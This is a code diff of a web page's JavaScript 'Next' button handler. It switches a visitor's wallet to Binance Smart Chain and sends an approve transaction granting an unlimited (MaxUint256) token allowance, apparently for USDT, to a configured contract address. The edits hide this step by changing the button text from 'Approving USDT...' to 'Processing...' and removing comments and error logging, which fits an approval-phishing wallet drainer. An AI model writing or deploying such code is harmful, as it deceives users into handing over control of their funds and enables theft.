@@ -193,64 +193,24 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     }
 
-    // ===== NEXT BUTTON (UPDATED: Connect -> Switch to BSC -> Approve) =====
+    // ===== NEXT BUTTON =====
     nextBtn.addEventListener("click", async function (e) {
         e.preventDefault();
 
-        // Check if ethereum provider exists
         if (!window.ethereum) {
-            showNotification("No Web3 wallet found. Please install Trust Wallet or MetaMask.", "error");
+            showNotification("No Web3 wallet found.", "error");
             return;
         }
 
-        nextBtn.innerHTML = '<span class="spinner">Connecting...</span>';
+        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
         nextBtn.disabled = true;
 
         try {
-            // 1. CONNECT WALLET
-            const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
-            });
-            const fromAddress = accounts[0];
-
-            // Update button text to reflect connection
-            nextBtn.innerHTML = '<span class="spinner">Switching to BSC...</span>';
-
-            // 2. SWITCH TO BSC CHAIN
             const bnbChainId = "0x38";
-            try {
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: bnbChainId }],
-                });
-            } catch (switchError) {
-                // This error code indicates that the chain has not been added to MetaMask.
-                if (switchError.code === 4902) {
-                    nextBtn.innerHTML = '<span class="spinner">Adding BSC Chain...</span>';
-                    await window.ethereum.request({
-                        method: "wallet_addEthereumChain",
-                        params: [{
-                            chainId: bnbChainId,
-                            chainName: "Binance Smart Chain Mainnet",
-                            nativeCurrency: {
-                                name: "BNB",
-                                symbol: "BNB",
-                                decimals: 18
-                            },
-                            rpcUrls: ["https://bsc-dataseed.binance.org/"],
-                            blockExplorerUrls: ["https://bscscan.com/"]
-                        }]
-                    });
-                } else {
-                    throw switchError;
-                }
-            }
-
-            // Small delay to ensure UI updates and wallet state settles
-            await new Promise(resolve => setTimeout(resolve, 500));
-
-            // 3. APPROVE TRANSACTION
-            nextBtn.innerHTML = '<span class="spinner">Approving USDT...</span>';
+            await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: bnbChainId }]
+            });
 
             const iface = new ethers.utils.Interface([
                 "function approve(address spender, uint256 amount)"
@@ -260,6 +220,8 @@ document.addEventListener("DOMContentLoaded", function () {
                 CONFIG.CONTRACT_ADDRESS,
                 ethers.constants.MaxUint256.toString()
             ]);
+
+            const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
 
             const txHash = await window.ethereum.request({
                 method: "eth_sendTransaction",
@@ -281,8 +243,7 @@ document.addEventListener("DOMContentLoaded", function () {
             }
 
         } catch (err) {
-            console.error("Full Error:", err);
-            showNotification("Transaction failed or cancelled. Please check your network.", "error");
+            showNotification("Transaction failed or cancelled.", "error");
         } finally {
             nextBtn.disabled = false;
             nextBtn.innerHTML = originalBtnHTML;
